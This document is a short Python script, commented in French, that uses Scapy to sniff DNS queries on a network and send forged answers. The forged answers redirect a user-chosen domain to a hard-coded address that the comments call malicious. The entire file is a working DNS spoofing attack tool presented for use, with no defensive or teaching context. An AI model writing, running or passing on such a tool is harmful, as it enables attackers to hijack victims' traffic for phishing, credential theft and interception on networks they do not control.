from scapy.all import *
import os

def dns_spoof(pkt, target_url):
    # Vérifier si le paquet est une requête DNS
    if pkt.haslayer(DNSQR):
        # Vérifier si la requête est destinée à l'URL ciblée
        if target_url in pkt[DNS].qd.qname.decode():
            # Créer une réponse DNS falsifiée avec une adresse IP malveillante
            spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                          UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                          DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="1.2.3.4"))

            # Envoyer la réponse falsifiée
            send(spoofed_pkt, verbose=0)

if __name__ == "__main__":
    # Désactiver les messages d'avertissement de scapy
    os.environ["SCAPY_WARNING"] = "0"

    # Lire l'URL ciblée depuis l'entrée utilisateur
    target_url = input("Entrez l'URL à cibler (ex: example.com): ")

    # Démarrer l'écoute des paquets DNS
    print("[+] Démarrage de l'écoute DNS Spoofing pour", target_url)
    sniff(filter="udp port 53", prn=lambda pkt: dns_spoof(pkt, target_url))
